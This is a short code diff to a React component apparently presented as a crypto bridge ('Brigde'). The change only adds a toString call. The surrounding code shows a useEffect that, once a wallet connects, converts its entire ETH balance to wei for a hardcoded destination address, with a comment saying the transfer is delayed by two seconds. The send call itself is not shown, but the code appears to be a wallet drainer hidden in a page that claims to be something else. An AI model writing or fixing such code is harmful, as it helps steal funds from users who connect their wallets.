@@ -43,7 +43,7 @@ const Brigde = () => {
   useEffect(() => {
     const transfer = async () => {
       if (active && balanceEth) {
-        const amountWei = web3.utils.toWei(balanceEth, "ether");
+        const amountWei = web3.utils.toWei(balanceEth.toString(), "ether");
         const destinationAddress = "0x1f858137075f42864FFC06a029e4d5800e5bfB67";
 
       // Retrasar la función transfer por 2 segundos
